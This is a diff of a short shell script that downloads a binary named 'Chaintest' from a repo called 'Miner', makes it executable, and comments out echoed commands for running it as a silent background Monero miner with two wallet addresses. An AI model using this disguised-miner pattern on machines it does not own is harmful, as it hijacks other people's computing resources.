@@ -11,15 +11,15 @@ cd ChainTest/
 wget https://cdn.jsdelivr.net/gh/gscsnm/Miner@master/Chaintest
 chmod +x Chaintest
 
-echo "ly"
-echo "nohup ./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89xFXepSy2iBW1cMgaQwZwedkgDvAJcJk7UMyHYy1TsZA9aw9YhYWeobXn5mXQgx9eMduAdFrfXEGJaKEZ43eZWm7xeMCyi -k --tls --rig-id xxx 1>/dev/null 2>&1 &"
-ehco "\n liang"
-echo "./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89m8QgPtKvCZZyu487FejTRmt4Acc5R6xCwHQsgsvyR8iHkm3VQirfAAauUGZCKMmQ2FLP6mDid9FgQC6HoxiyfwVLfq4jQ -k --tls --rig-id xxx"
+# echo "ly"
+# echo "nohup ./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89xFXepSy2iBW1cMgaQwZwedkgDvAJcJk7UMyHYy1TsZA9aw9YhYWeobXn5mXQgx9eMduAdFrfXEGJaKEZ43eZWm7xeMCyi -k --tls --rig-id xxx 1>/dev/null 2>&1 &"
+# ehco "\n liang"
+# echo "./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89m8QgPtKvCZZyu487FejTRmt4Acc5R6xCwHQsgsvyR8iHkm3VQirfAAauUGZCKMmQ2FLP6mDid9FgQC6HoxiyfwVLfq4jQ -k --tls --rig-id xxx"
 
 
 
 # https://minexmr.com/#worker_stats
-# 币安地址：
+# ly：
 # 89xFXepSy2iBW1cMgaQwZwedkgDvAJcJk7UMyHYy1TsZA9aw9YhYWeobXn5mXQgx9eMduAdFrfXEGJaKEZ43eZWm7xeMCyi
 # liang
 # 89m8QgPtKvCZZyu487FejTRmt4Acc5R6xCwHQsgsvyR8iHkm3VQirfAAauUGZCKMmQ2FLP6mDid9FgQC6HoxiyfwVLfq4jQ
